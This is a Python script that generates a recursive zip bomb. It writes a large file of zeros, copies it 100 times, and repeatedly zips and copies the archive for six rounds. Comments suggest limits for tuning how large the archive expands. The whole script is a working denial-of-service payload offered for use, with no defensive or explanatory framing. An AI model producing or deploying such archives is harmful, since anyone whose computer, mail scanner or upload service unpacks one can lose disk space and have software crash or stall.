import os 
import shutil

##==================
##Write a file
##==================
print("Writing file...")

os.makedirs("bomb")

with open("bomb/death1.txt", "w") as f:
    f.write("0"*20000000)  #Recommended limit: less than 0.5 - 1 bil 

##==================
##Duplicate
##==================
print("Duplicating files...")

for i in range(2, 101):  #Recommended limit: less than 500
    shutil.copy("bomb/death1.txt", f"bomb/death{i}.txt")

##==================
##Zipping files
##==================
print("Zipping files...")
shutil.make_archive("bomb", "zip", "bomb")
shutil.rmtree("bomb")

##===================================
## Duplicating zips
##===================================
print("Duplicating zips, zip them, and repeat...")

for i in range(6):   #Recommended limit: 6-7
    print("Round", i+1)

    os.makedirs("bomb")
    shutil.move("bomb.zip", "bomb")

    print("Duplicating...")
    for j in range(2, 101): #Recommended limit: less than 500
        shutil.copy("bomb/bomb.zip", f"bomb/bomb{j}.zip")

    print("Zipping...")
    shutil.make_archive("bomb", "zip", "bomb")
    shutil.rmtree("bomb")


print("Done!")

